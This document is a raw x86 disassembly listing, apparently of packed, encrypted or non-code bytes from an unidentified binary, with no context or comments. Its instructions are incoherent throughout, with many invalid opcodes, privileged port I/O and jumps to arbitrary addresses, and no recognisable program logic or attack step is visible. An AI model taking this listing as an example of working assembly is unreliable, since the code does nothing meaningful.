  41ba8b:	pop    ebx
  41ba8c:	push   cs
  41ba8d:	pop    esi
  41ba8e:	pop    esp
  41ba8f:	retf   
  41ba90:	jb     0x41ba38
  41ba92:	mov    ecx,0xf537e86f
  41ba97:	out    dx,al
  41ba98:	dec    ebp
  41ba99:	cmp    bl,BYTE PTR [edi]
  41ba9b:	add    BYTE PTR [edx],bl
  41ba9d:	mov    bl,0x2e
  41ba9f:	jge    0x41ba49
  41baa1:	stos   DWORD PTR es:[edi],eax
  41baa2:	mov    ecx,0x64d8afad
  41baa7:	mov    al,ds:0xb4f9b417
  41baac:	lock mov ds:0x2f790306,al
  41bab2:	repz not DWORD PTR [ebx]
  41bab5:	lds    edi,FWORD PTR [ebp+0x13a1625a]
  41babb:	ffree  st(2)
  41babd:	adc    ah,BYTE PTR [eax-0x4c]
  41bac0:	dec    esp
  41bac1:	sbb    eax,esi
  41bac3:	not    BYTE PTR [eax]
  41bac5:	mov    ds:0xc8c455a8,eax
  41baca:	add    cl,cl
  41bacc:	or     eax,0x75d3046b
  41bad1:	or     BYTE PTR [ebp-0x26],dl
  41bad4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bad5:	retf   
  41bad6:	jnp    0x41ba76
  41bad8:	ins    BYTE PTR es:[edi],dx
  41bad9:	push   ebp
  41bada:	adc    DWORD PTR [ecx+0x7cb9ea0],ecx
  41bae0:	mov    edx,0xc6eb11f5
  41bae5:	jmp    0x651b08de
  41baea:	test   BYTE PTR [edx],0xa
  41baed:	xchg   ebp,eax
  41baee:	daa    
  41baef:	ror    DWORD PTR [edi],1
  41baf1:	sbb    esp,DWORD PTR [ebp+0x10cad29b]
  41baf7:	push   ecx
  41baf8:	loopne 0x41bac3
  41bafa:	fidivr DWORD PTR [esi-0x13]
  41bafd:	mov    edx,0x2a999c4f
  41bb02:	and    ebp,DWORD PTR [eax]
  41bb04:	lods   al,BYTE PTR ds:[esi]
  41bb05:	adc    DWORD PTR ds:0xf436da3d,ebx
  41bb0b:	test   DWORD PTR [edi],ecx
  41bb0d:	jp     0x41bb48
  41bb0f:	mov    edx,DWORD PTR [edx+0x4e19147d]
  41bb15:	xor    eax,0x3ba61926
  41bb1a:	or     al,0x21
  41bb1c:	cmp    al,0xa6
  41bb1e:	sbb    esp,DWORD PTR [eax-0x2fa0e038]
  41bb24:	fcmovbe st,st(2)
  41bb26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb27:	push   cs
  41bb28:	push   edi
  41bb29:	out    dx,eax
  41bb2a:	mov    bh,0x40
  41bb2c:	cwde   
  41bb2d:	push   esi
  41bb2e:	xor    BYTE PTR [ebx+0x2dd48c01],0xd5
  41bb35:	loop   0x41bb4c
  41bb37:	jb     0x41bb64
  41bb39:	sub    DWORD PTR [esi],esp
  41bb3b:	or     eax,0x2d8b72e4
  41bb40:	(bad)  
  41bb42:	xlat   BYTE PTR ds:[ebx]
  41bb43:	sub    DWORD PTR [esi+0x47],0xffffff97
  41bb47:	add    edx,DWORD PTR gs:[ebp-0x66599838]
  41bb4e:	call   0x59ff:0x4cba93c1
  41bb55:	inc    esi
  41bb56:	add    eax,0xc5f7db95
  41bb5b:	jo     0x41bb05
  41bb5d:	jmp    0x89e0:0xce69ef85
  41bb64:	out    dx,eax
  41bb65:	fcomp  DWORD PTR [esi]
  41bb67:	loop   0x41bb1f
  41bb69:	mov    bl,0x41
  41bb6b:	add    bl,cl
  41bb6d:	mov    bh,0xec
  41bb6f:	(bad)  
  41bb70:	pusha  
  41bb71:	popa   
  41bb72:	push   ebp
  41bb73:	sbb    BYTE PTR ds:0xf67897c8,bh
  41bb79:	cli    
  41bb7a:	adc    BYTE PTR [ebp-0x2bf4b7d6],dl
  41bb80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb81:	cli    
  41bb82:	push   esp
  41bb83:	sbb    al,0x7
  41bb85:	pop    esp
  41bb86:	sbb    dh,BYTE PTR [ecx*8+0x631bd519]
  41bb8d:	lds    ecx,FWORD PTR [esi]
  41bb8f:	out    dx,al
  41bb90:	jno    0x41bba2
  41bb92:	or     DWORD PTR [eax-0x61],ebp
  41bb95:	mov    ebp,edi
  41bb97:	in     eax,dx
  41bb98:	aam    0xd8
  41bb9a:	sub    ecx,DWORD PTR [ecx]
  41bb9c:	out    dx,al
  41bb9d:	ds es pop ebp
  41bba0:	mov    gs,ebp
  41bba2:	jno    0x41bb78
  41bba4:	(bad)  
  41bba5:	pop    ss
  41bba6:	add    dh,BYTE PTR [ebx]
  41bba8:	push   ss
  41bba9:	in     eax,0x94
  41bbab:	add    DWORD PTR [edx+0x21],esp
  41bbae:	push   esp
  41bbaf:	dec    edi
  41bbb0:	xchg   ebx,eax
  41bbb1:	nop
  41bbb2:	xchg   ebp,eax
  41bbb3:	xchg   ebx,eax
  41bbb4:	pop    edx
  41bbb5:	mov    gs,WORD PTR [ecx-0xb]
  41bbb8:	lods   eax,DWORD PTR ds:[esi]
  41bbb9:	leave  
  41bbba:	sub    DWORD PTR [ecx+eiz*4+0x60],edx
  41bbbe:	sahf   
  41bbbf:	adc    BYTE PTR [edi-0x3d],al
  41bbc2:	lea    eax,[eax-0x4e]
  41bbc5:	loopne 0x41bb72
  41bbc7:	imul   ebx,DWORD PTR [ebx-0x762d0ef4],0xfffffffd
  41bbce:	mov    ecx,0x343e2472
  41bbd3:	adc    cl,bh
  41bbd5:	sbb    al,0x45
  41bbd7:	frstor [ecx+0x6f5798b4]
  41bbdd:	inc    ebp
  41bbde:	jg     0x41bbcd
  41bbe0:	jmp    0x1b64770
  41bbe5:	ficomp DWORD PTR [ebx+0x7f]
  41bbe8:	iret   
  41bbe9:	xchg   DWORD PTR [ebp+0x5],eax
  41bbec:	cmp    ecx,edx
  41bbee:	or     ebx,eax
  41bbf0:	aad    0xab
  41bbf2:	and    al,0x84
  41bbf4:	xchg   ecx,eax
  41bbf5:	arpl   WORD PTR [ebx-0x41],sp
  41bbf8:	jo     0x41bc51
  41bbfa:	daa    
  41bbfb:	sub    al,0x39
  41bbfd:	jb     0x41bc3f
  41bbff:	add    ebx,DWORD PTR [ecx+0x399e8c00]
  41bc05:	mov    al,0x4d
  41bc07:	cdq    
  41bc08:	fucomp st(0)
  41bc0a:	pop    ebx
  41bc0b:	imul   ecx,DWORD PTR [ebx],0xfd097406
  41bc11:	add    DWORD PTR [ebp-0x4377308],eax
  41bc17:	ss push cs
  41bc19:	sbb    al,0x71
  41bc1b:	leave  
  41bc1c:	dec    esi
  41bc1d:	mov    ds:0x54d07a26,eax
  41bc22:	scas   eax,DWORD PTR es:[edi]
  41bc23:	cmp    al,0x16
  41bc25:	ins    DWORD PTR es:[edi],dx
  41bc26:	(bad)  
  41bc28:	dec    esi
  41bc29:	pop    ebx
  41bc2a:	dec    edx
  41bc2b:	pop    eax
  41bc2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bc2d:	or     cl,BYTE PTR [ecx]
  41bc2f:	imul   BYTE PTR [ecx+0x65ef568]
  41bc35:	or     BYTE PTR ds:0x5b06aa13,dl
  41bc3b:	mov    dh,0xfc
  41bc3d:	adc    al,BYTE PTR [edi+ecx*2]
  41bc40:	dec    esi
  41bc41:	push   eax
  41bc42:	mov    al,ds:0xf5ad8ba9
  41bc47:	scas   al,BYTE PTR es:[edi]
  41bc48:	mov    bl,0xa
  41bc4a:	xchg   edx,eax
  41bc4b:	xor    al,0xe4
  41bc4d:	cmc    
  41bc4e:	cmp    al,0x75
  41bc50:	push   esp
  41bc51:	jo     0x41bc9b
  41bc53:	mov    eax,DWORD PTR [ecx]
  41bc55:	loope  0x41bbda
  41bc57:	inc    edi
  41bc58:	enter  0x2e1d,0xa3
  41bc5c:	or     ebp,DWORD PTR [ecx-0x2b]
  41bc5f:	ins    BYTE PTR es:[edi],dx
  41bc60:	in     eax,0x65
  41bc62:	lock scas al,BYTE PTR es:[edi]
  41bc64:	jno    0x41bbe8
  41bc66:	in     eax,0xaa
  41bc68:	or     DWORD PTR [ebx],edx
  41bc6a:	sbb    DWORD PTR [ecx+0x5a0eddc7],esi
  41bc70:	jae    0x41bc57
  41bc72:	leave  
  41bc73:	or     eax,0xebac9cc3
  41bc78:	sub    eax,edx
  41bc7a:	sbb    eax,0x60f9a096
  41bc7f:	mov    edi,0x275bd473
  41bc84:	je     0x41bc9c
  41bc86:	mov    edi,0x3c29b1b7
  41bc8b:	fsubr  DWORD PTR [eax*1+0x933840e]
  41bc92:	rcr    DWORD PTR ds:[edi],1
  41bc95:	test   BYTE PTR gs:[esi],bl
  41bc98:	sbb    dh,BYTE PTR [esp+ebx*2]
  41bc9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc9c:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  41bc9e:	xchg   edi,eax
  41bc9f:	ins    DWORD PTR es:[edi],dx
  41bca0:	sub    eax,0xec409ed2
  41bca5:	jmp    0xb1ad:0xac3b99ed
  41bcac:	aas    
  41bcad:	sbb    al,0x64
  41bcaf:	pop    ds
  41bcb0:	call   0x835b:0x6274954f
  41bcb7:	pusha  
  41bcb8:	inc    eax
  41bcb9:	xchg   ebx,eax
  41bcba:	mov    al,0x1c
  41bcbc:	pop    ebp
  41bcbd:	ins    DWORD PTR es:[edi],dx
  41bcbe:	es push ebp
  41bcc0:	mov    bh,0x17
  41bcc2:	lods   al,BYTE PTR ds:[esi]
  41bcc3:	int    0x6
  41bcc5:	ss stos DWORD PTR es:[edi],eax
  41bcc7:	xor    ah,BYTE PTR [ebx-0x4b]
  41bcca:	mov    ch,0xae
  41bccc:	test   BYTE PTR [edx],ch
  41bcce:	sbb    BYTE PTR [ebp+0x2c0874fe],al
  41bcd4:	test   al,0x2c
  41bcd6:	imul   esi,DWORD PTR [eax],0x1dea0bbd
  41bcdc:	sbb    al,BYTE PTR [eax-0x6a]
  41bcdf:	or     dl,ah
  41bce1:	cli    
  41bce2:	xchg   edi,eax
  41bce3:	scas   eax,DWORD PTR es:[edi]
  41bce4:	xchg   ebx,eax
  41bce5:	cwde   
  41bce6:	out    0x1e,al
  41bce8:	pop    eax
  41bce9:	or     eax,0x4cb9f6db
  41bcee:	push   0xfffffff5
  41bcf0:	dec    esp
  41bcf1:	or     al,0xfe
  41bcf3:	xor    bl,ah
  41bcf5:	xor    cl,BYTE PTR [eax-0x10]
  41bcf8:	repnz fld QWORD PTR [esi-0x14]
  41bcfc:	(bad)  
  41bcff:	adc    edx,DWORD PTR [ecx]
  41bd01:	cs in  eax,0x57
  41bd04:	or     al,BYTE PTR [edi-0x314efd9b]
  41bd0a:	test   eax,0x887e0801
  41bd0f:	push   ecx
  41bd10:	(bad)  
  41bd11:	ss or  dl,cl
  41bd14:	fucomip st,st(2)
  41bd16:	cmp    ecx,DWORD PTR [edi-0x23]
  41bd19:	dec    edx
  41bd1a:	mov    al,ds:0x7d9763f8
  41bd1f:	ror    ecx,0xc1
  41bd22:	mov    fs,WORD PTR [ebx+edi*2]
  41bd25:	mov    ch,0x26
  41bd27:	jl     0x41bcc4
  41bd29:	retf   0x1b89
  41bd2c:	in     al,0x79
  41bd2e:	(bad)  
  41bd30:	dec    esi
  41bd31:	xor    cl,BYTE PTR [eax]
  41bd33:	les    ebp,FWORD PTR [ecx+0x4e867e8a]
  41bd39:	test   al,0x4f
  41bd3b:	ret    
  41bd3c:	adc    esi,DWORD PTR [ebp+eiz*4+0x51fd4d65]
  41bd43:	mov    ecx,DWORD PTR [edi+0x6d]
  41bd46:	mov    ah,0xf3
  41bd48:	in     eax,0x5a
  41bd4a:	int    0xc4
  41bd4c:	mov    ds:0x98657795,al
  41bd51:	mov    dl,0xa0
  41bd53:	(bad)  
  41bd54:	lock pop esi
  41bd56:	sbb    BYTE PTR [edi-0x48],ch
  41bd59:	xor    al,0xc5
  41bd5b:	lods   al,BYTE PTR ds:[esi]
  41bd5c:	(bad)  
  41bd5d:	jmp    0x3cd18a01
  41bd62:	cmp    DWORD PTR [esi],ebp
  41bd64:	xor    eax,0x89de602e
  41bd69:	pop    esi
  41bd6a:	mov    ah,0xf9
  41bd6c:	fmul   st,st(7)
  41bd6e:	push   esp
  41bd6f:	outs   dx,DWORD PTR ds:[esi]
  41bd70:	xor    al,0x66
  41bd72:	xchg   DWORD PTR [esi+0x20be0daf],ebx
  41bd78:	test   DWORD PTR [esi+0x2f],ebp
  41bd7b:	adc    eax,0x3a3fb2
  41bd80:	shl    BYTE PTR [edi-0x29],0x8
  41bd84:	scas   al,BYTE PTR es:[edi]
  41bd85:	jo     0x41bd35
  41bd87:	sbb    eax,0x2fe7947c
  41bd8c:	sbb    BYTE PTR [esi],0x55
  41bd8f:	scas   al,BYTE PTR es:[edi]
  41bd90:	push   ebp
  41bd91:	sub    BYTE PTR [esi-0x41],dh
  41bd94:	xchg   esp,eax
  41bd95:	iret   
  41bd96:	dec    edi
  41bd97:	cwde   
  41bd98:	mov    esi,0xa337b4aa
  41bd9d:	dec    ebx
  41bd9e:	int    0x96
  41bda0:	loope  0x41bd9f
  41bda2:	es in  eax,0x62
  41bda5:	in     al,dx
  41bda6:	dec    esp
  41bda7:	inc    ecx
  41bda8:	adc    eax,0xc7265c75
  41bdad:	sbb    DWORD PTR [ebp+ecx*4-0x78],esi
  41bdb1:	push   ds
  41bdb2:	xchg   esp,eax
  41bdb3:	push   cs
  41bdb4:	pushf  
  41bdb5:	push   0x46e58c77
  41bdba:	pop    edi
  41bdbb:	stc    
  41bdbc:	xchg   edi,eax
  41bdbd:	loope  0x41bd4f
  41bdbf:	pop    eax
  41bdc0:	mov    ebx,edx
  41bdc2:	sti    
  41bdc3:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  41bdc5:	jmp    DWORD PTR [ebx-0xf]
  41bdc8:	into   
  41bdc9:	aam    0x78
  41bdcb:	cmp    edi,edx
  41bdcd:	push   ss
  41bdce:	lea    edi,[edi-0x6b71852e]
  41bdd4:	inc    edx
  41bdd5:	popf   
  41bdd6:	in     al,0x71
  41bdd8:	push   edi
  41bdd9:	(bad)  
  41bdda:	jb     0x41bdca
  41bddc:	int3   
  41bddd:	mov    ?,WORD PTR [esi-0x7e7f8193]
  41bde3:	pop    ebx
  41bde4:	xor    bh,BYTE PTR [eax+edi*8]
  41bde7:	(bad)  
  41bde8:	sub    cl,dh
  41bdea:	(bad)  
  41bdeb:	fmul   QWORD PTR [ecx+eax*1-0x3a]
  41bdef:	call   0xd189:0xd1f261da
  41bdf6:	and    ch,BYTE PTR [ebx+0x4a5f7373]
  41bdfc:	popf   
  41bdfd:	jmp    0xa0edd790
  41be02:	sub    eax,0x58523e7e
  41be07:	pusha  
  41be08:	mov    WORD PTR [ecx+ecx*8],fs
  41be0b:	(bad)  
  41be0d:	xchg   edi,eax
  41be0e:	(bad)  [ebx-0x38]
  41be11:	test   DWORD PTR [eax+0x42],esi
  41be14:	inc    eax
  41be15:	jbe    0x41bdbc
  41be17:	xor    ecx,DWORD PTR [ecx-0x26]
  41be1a:	cmp    BYTE PTR [ebx+0x6432972d],dh
  41be20:	xor    bh,BYTE PTR [ecx+0xc]
  41be23:	popf   
  41be24:	imul   eax,DWORD PTR [edi],0x64
  41be27:	inc    eax
  41be28:	jp     0x41be4f
  41be2a:	and    ebp,DWORD PTR [edx+0x4a288e7c]
  41be30:	in     al,dx
  41be31:	cmp    dl,BYTE PTR [edi-0x1]
  41be34:	and    ecx,DWORD PTR [bx+si-0x15]
  41be38:	cs stos DWORD PTR es:[edi],eax
  41be3a:	mov    ?,WORD PTR ss:[esi+0x23]
  41be3e:	inc    edx
  41be3f:	(bad)  
  41be40:	push   0x6efe8cfd
  41be45:	xor    BYTE PTR [ebx+0x5e],0xc4
  41be49:	call   0x13b5:0x3e147797
  41be50:	sbb    bl,BYTE PTR [esp+ebp*2-0x12]
  41be54:	rcl    DWORD PTR [esp+edx*8-0x2d3af73f],1
  41be5b:	(bad)  [edi+edi*2]
  41be5e:	ss int 0xb2
  41be61:	sar    BYTE PTR [edi],0x5c
  41be64:	pop    eax
  41be65:	std    
  41be66:	jbe    0x41be35
  41be68:	dec    edx
  41be69:	dec    edx
  41be6a:	xchg   ebp,eax
  41be6b:	jbe    0x41beb4
  41be6d:	repz push ebp
  41be6f:	or     dl,0x2c
  41be72:	sbb    bl,BYTE PTR [ebp+0x6]
  41be75:	xor    BYTE PTR [eax+0x3b],cl
  41be78:	das    
  41be79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be7a:	rcr    DWORD PTR [eax-0x60],cl
  41be7d:	cmp    esp,DWORD PTR [edx]
  41be7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41be80:	(bad)
  41be83:	les    ebp,FWORD PTR [ebx-0x113bcf2a]
  41be89:	adc    ah,BYTE PTR [esi]
  41be8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41be8c:	sbb    al,0x7e
  41be8e:	das    
  41be8f:	stc    
  41be90:	repz and BYTE PTR [edi+0x61],al
  41be94:	add    BYTE PTR [ecx-0x65],0x2f
  41be98:	and    ecx,eax
  41be9a:	mov    WORD PTR [eax-0x6f],ds
  41be9d:	in     al,dx
  41be9e:	clc    
  41be9f:	push   cs
  41bea0:	(bad)  
  41bea1:	loop   0x41be86
  41bea3:	shr    DWORD PTR [ecx],0xb7
  41bea6:	mov    al,ds:0x484a7949
  41beab:	clc    
  41beac:	or     DWORD PTR [eax],esp
  41beae:	and    DWORD PTR [esi+0x8],eax
  41beb1:	push   0xffffff86
  41beb3:	clc    
  41beb4:	(bad)  
  41beb5:	jo     0x41be7d
  41beb7:	dec    esp
  41beb8:	dec    eax
  41beb9:	or     al,0x9b
  41bebb:	sbb    ah,BYTE PTR [edx]
  41bebd:	sub    DWORD PTR [edi+0x3e8e396a],ebx
  41bec3:	cmp    eax,0xcf6e5129
  41bec8:	cmp    BYTE PTR [edi],0xbc
  41becb:	rol    DWORD PTR [esi+ebx*1+0x59],1
  41becf:	and    DWORD PTR [ebp+0x68],ebx
  41bed2:	lahf   
  41bed3:	outs   dx,BYTE PTR ds:[esi]
  41bed4:	andps  xmm0,XMMWORD PTR [esi+esi*8-0x41fc9296]
  41bedc:	xchg   DWORD PTR [esi-0x4d4b93fc],esi
  41bee2:	js     0x41bec9
  41bee4:	stc    
  41bee5:	jae    0x41beed
  41bee7:	jbe    0x41bf20
  41bee9:	pop    ebp
  41beea:	jae    0x41bec9
  41beec:	stos   DWORD PTR es:[edi],eax
  41beed:	mov    eax,DWORD PTR [eax]
  41beef:	out    dx,eax
  41bef0:	idiv   DWORD PTR [ebx]
  41bef2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bef3:	cli    
  41bef4:	xor    dh,bh
  41bef6:	fs or  eax,0x6cd6b98f
  41befc:	mov    DWORD PTR [ebp-0x47968f1d],esp
  41bf02:	and    ebp,eax
  41bf04:	push   DWORD PTR [esi-0x8958202]
  41bf0a:	std    
  41bf0b:	xor    DWORD PTR [ecx],ebx
  41bf0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf0e:	arpl   WORD PTR ds:0xa5ab59fa,si
  41bf14:	dec    ecx
  41bf15:	push   eax
  41bf16:	inc    ebx
  41bf17:	int    0x62
  41bf19:	cs and bl,al
  41bf1c:	or     eax,0xe97ef10d
  41bf21:	dec    esp
  41bf22:	sbb    DWORD PTR [ebp+ecx*1-0x14848e3e],esp
  41bf29:	mov    dl,0x3b
  41bf2b:	aad    0x84
  41bf2d:	aaa    
  41bf2e:	mov    dl,0xdd
  41bf30:	push   ss
  41bf31:	fdiv   DWORD PTR ds:0xa83e4188
  41bf37:	pop    ecx
  41bf38:	pop    edi
  41bf39:	pushf  
  41bf3a:	in     al,dx
  41bf3b:	sub    eax,esi
  41bf3d:	inc    ebx
  41bf3e:	adc    al,0x85
  41bf40:	scas   eax,DWORD PTR es:[edi]
  41bf41:	out    0x28,al
  41bf43:	sbb    cl,BYTE PTR [edi-0x7483c260]
  41bf49:	fst    DWORD PTR [esi]
  41bf4b:	sbb    edx,DWORD PTR [esi-0x10b9b38c]
  41bf51:	ret    0x28ed
  41bf54:	popa   
  41bf55:	(bad)
  41bf58:	pop    edi
  41bf59:	std    
  41bf5a:	sbb    ch,BYTE PTR [edx-0x452dc935]
  41bf60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf61:	lea    edi,[ecx-0x45]
  41bf64:	jle    0x41bf80
  41bf66:	jle    0x41bf99
  41bf68:	popa   
  41bf69:	(bad)  
  41bf6b:	cwde   
  41bf6c:	xor    bl,BYTE PTR [ecx+ebp*4]
  41bf6f:	int    0x91
  41bf71:	pop    esi
  41bf72:	mov    ds,WORD PTR [ebx+ebp*4+0x72dddedc]
  41bf79:	xchg   BYTE PTR [edi],bh
  41bf7b:	out    0x5c,eax
  41bf7d:	das    
  41bf7e:	dec    edi
  41bf7f:	sbb    al,0x6d
  41bf81:	and    dh,BYTE PTR [esi]
  41bf83:	dec    eax
  41bf84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf85:	pop    ecx
  41bf86:	das    
  41bf87:	or     esp,DWORD PTR [eax]
  41bf89:	aad    0x11
  41bf8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf8c:	xchg   ebp,eax
  41bf8d:	mov    ebx,0xb561441
  41bf92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf93:	shl    BYTE PTR [eax+0x1b9e5def],0x76
  41bf9a:	(bad)
  41bf9e:	push   0x4a
  41bfa0:	adc    dl,BYTE PTR [esi]
  41bfa2:	fwait
  41bfa3:	lock dec edi
  41bfa5:	call   0x3ff753be
  41bfaa:	cmc    
  41bfab:	jl     0x41bf6a
  41bfad:	mov    ds:0x98e9c79d,al
  41bfb2:	inc    eax
  41bfb3:	sbb    DWORD PTR [esi-0x61],edx
  41bfb6:	jne    0x41c026
  41bfb8:	shl    bl,1
  41bfba:	or     DWORD PTR [esp+edi*2],0xffffffdd
  41bfbe:	xor    ch,BYTE PTR [ebp+0x68]
  41bfc1:	or     dh,BYTE PTR [ebx+edi*2]
  41bfc4:	stos   BYTE PTR es:[edi],al
  41bfc5:	mov    ch,0x40
  41bfc7:	rcl    cl,1
  41bfc9:	shl    DWORD PTR [ecx+0x711f3ae9],0xfe
  41bfd0:	hlt    
  41bfd1:	xlat   BYTE PTR ds:[ebx]
  41bfd2:	call   0x609f:0xd329b48c
  41bfd9:	out    dx,eax
  41bfda:	sub    bl,dl
  41bfdc:	ret    
  41bfdd:	xchg   edx,eax
  41bfde:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bfdf:	and    ch,bh
  41bfe1:	jb     0x41bf91
  41bfe3:	outs   dx,DWORD PTR ds:[esi]
  41bfe4:	dec    eax
  41bfe5:	mul    DWORD PTR [ecx-0x1d]
  41bfe8:	adc    BYTE PTR [esi-0x21],0xe9
  41bfec:	cs xchg ecx,eax
  41bfee:	arpl   WORD PTR ds:0xfd4e5d78,dx
  41bff4:	test   al,0xe8
  41bff6:	outs   dx,BYTE PTR ds:[esi]
  41bff7:	add    dh,dl
  41bff9:	and    eax,0xab59e04d
  41bffe:	cs sub al,0xd2
  41c001:	mov    eax,ds:0x1abe8144
  41c006:	jnp    0x41bfc9
  41c008:	call   0xd34f624e
  41c00d:	inc    edx
  41c00f:	sahf   
  41c010:	ror    DWORD PTR [eax+0x4b90b4b0],cl
  41c016:	jno    0x41c08e
  41c018:	jbe    0x41bfe6
  41c01a:	in     eax,0xc4
  41c01c:	addr16 jb 0x41c028
  41c01f:	add    al,BYTE PTR [ecx+0x5e47c8fd]
  41c025:	gs sub ah,bh
  41c028:	bound  ecx,QWORD PTR [edi+0x7b]
  41c02b:	mov    bl,0xd
  41c02d:	sub    BYTE PTR [esi-0x7ce65fe2],ch
  41c033:	mov    WORD PTR [esi-0x25],fs
  41c036:	cmc    
  41c037:	xor    al,0x63
  41c039:	add    BYTE PTR [eax],ah
  41c03b:	push   esi
  41c03c:	mov    WORD PTR [edx-0x3a0fa89a],ss
  41c042:	out    0xfb,eax
  41c044:	addr16 jl 0x41c071
  41c047:	scas   al,BYTE PTR es:[edi]
  41c048:	jp     0x41c034
  41c04a:	ins    DWORD PTR es:[edi],dx
  41c04b:	fld    st(6)
  41c04d:	fcomp  DWORD PTR [ecx+0x34e93dc9]
  41c053:	lods   eax,DWORD PTR ds:[esi]
  41c054:	lods   eax,DWORD PTR ds:[esi]
  41c055:	dec    esi
  41c056:	sbb    ebp,ebx
  41c058:	xor    bl,BYTE PTR [edx+0x70]
  41c05b:	inc    ebx
  41c05c:	add    DWORD PTR [ebp+0x75295499],ebx
  41c062:	aam    0x9a
  41c064:	int    0xb8
  41c066:	jmp    0x41c06d
  41c068:	arpl   WORD PTR [edi-0x73642dfa],di
  41c06e:	dec    esi
  41c06f:	out    dx,eax
  41c070:	into   
  41c071:	icebp  
  41c072:	loop   0x41c092
  41c074:	push   es
  41c075:	stos   DWORD PTR es:[edi],eax
  41c076:	or     BYTE PTR [ebx+0x27c4cc08],0xc2
  41c07d:	xchg   ecx,eax
  41c07e:	xchg   edi,eax
  41c07f:	lock sub al,0xd9
  41c082:	pop    eax
  41c083:	mov    ch,0x1c
  41c085:	jb     0x41c0b7
  41c087:	push   ss
  41c088:	sti    
  41c089:	gs (bad) 
  41c08b:	mov    eax,0x2c8a5a0
  41c090:	mov    ch,0xbd
  41c092:	sbb    esp,ecx
  41c094:	fxch   st(1)
  41c096:	addr16 popa 
  41c098:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c099:	pusha  
  41c09a:	outs   dx,BYTE PTR ds:[esi]
  41c09b:	mov    al,0xab
  41c09d:	dec    esi
  41c09e:	aad    0x73
  41c0a0:	push   edi
  41c0a1:	int3   
  41c0a2:	sub    BYTE PTR [esi],dl
  41c0a4:	out    0xc,al
  41c0a6:	mov    dh,0x41
  41c0a8:	(bad)  
  41c0a9:	xor    eax,0x699d5e62
  41c0ae:	test   BYTE PTR [ecx+0x6f6af29],bh
  41c0b4:	outs   dx,DWORD PTR ds:[esi]
  41c0b5:	sbb    ebp,edi
  41c0b7:	ins    BYTE PTR es:[edi],dx
  41c0b8:	and    eax,0x94712adf
  41c0bd:	sub    DWORD PTR [esp+ebx*4-0x56],esi
  41c0c1:	pop    ebp
  41c0c2:	push   ss
  41c0c3:	(bad)  
  41c0c4:	ss gs adc al,0xd4
  41c0c8:	daa    
  41c0c9:	pushf  
  41c0ca:	and    eax,0x1151d647
  41c0cf:	inc    edi
  41c0d0:	add    eax,edi
  41c0d2:	repz pop edx
  41c0d4:	xor    eax,0x1c35114a
  41c0d9:	ror    DWORD PTR [ebx-0x62],cl
  41c0dc:	mov    esi,0x24cd37bc
  41c0e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c0e2:	jae    0x41c0ed
  41c0e4:	xchg   DWORD PTR [ebp-0xfbc5bd1],eax
  41c0ea:	ins    BYTE PTR es:[edi],dx
  41c0eb:	pushf  
  41c0ec:	in     eax,0x45
  41c0ee:	mov    dl,0xd6
  41c0f0:	adc    DWORD PTR [eax+0x34defea0],ebp
  41c0f6:	dec    edi
  41c0f7:	adc    BYTE PTR [esp+eax*4+0x72648d96],ch
  41c0fe:	push   ebp
  41c0ff:	ins    DWORD PTR es:[edi],dx
  41c100:	(bad)  
  41c101:	gs es xor eax,0xa32e61ad
  41c108:	call   0xb687e12c
  41c10d:	std    
  41c10e:	jmp    0x6820:0xf48c027f
  41c115:	popf   
  41c116:	test   eax,0x7cc34365
  41c11b:	icebp  
  41c11c:	fmul   st,st(0)
  41c11e:	jnp    0x41c12b
  41c120:	repnz dec ebp
  41c122:	mov    BYTE PTR [edi-0x7410712e],ah
  41c128:	sub    DWORD PTR [edi+esi*2-0x4d],ecx
  41c12c:	test   al,0x44
  41c12e:	add    BYTE PTR [eax+0x25],dh
  41c131:	loope  0x41c120
  41c133:	jae    0x41c18d
  41c135:	in     eax,dx
  41c136:	adc    bh,bh
  41c138:	xor    dh,BYTE PTR [edi-0x410de9c1]
  41c13e:	adc    bh,BYTE PTR [eax]
  41c140:	cmp    edx,esi
  41c142:	dec    esp
  41c143:	lods   eax,DWORD PTR ds:[esi]
  41c144:	sub    eax,0x33ac476
  41c149:	jb     0x41c198
  41c14b:	mov    ah,0xfe
  41c14d:	hlt    
  41c14e:	adc    DWORD PTR [edx+0x1c],ebx
  41c151:	pusha  
  41c152:	push   eax
  41c153:	stos   DWORD PTR es:[edi],eax
  41c154:	sbb    DWORD PTR [ecx+0x6c],0x47d809ef
  41c15b:	adc    DWORD PTR [edx+eax*2-0x61],edx
  41c15f:	mov    DWORD PTR [edi+0x50120b17],edi
  41c165:	sub    BYTE PTR [ebx+0x51],dh
  41c168:	push   edx
  41c169:	push   cs
  41c16a:	ds sbb al,0xf8
  41c16d:	(bad)  
  41c16e:	scas   al,BYTE PTR es:[edi]
  41c16f:	(bad)  
  41c170:	icebp  
  41c171:	add    BYTE PTR [esi],ah
  41c173:	xor    DWORD PTR [ebx],esi
  41c175:	shl    DWORD PTR [edi+ebp*8-0x553ab3d2],cl
  41c17c:	push   ds
  41c17d:	icebp  
  41c17e:	pop    edx
  41c17f:	xor    edi,DWORD PTR [eax+0x5f]
  41c182:	lahf   
  41c183:	dec    edx
  41c184:	out    0x75,eax
  41c186:	ins    DWORD PTR es:[edi],dx
  41c187:	add    al,0x1c
  41c189:	pop    ebp
  41c18a:	outs   dx,BYTE PTR ds:[esi]
  41c18b:	jne    0x41c1b3
  41c18d:	xor    al,BYTE PTR [eax-0x3e]
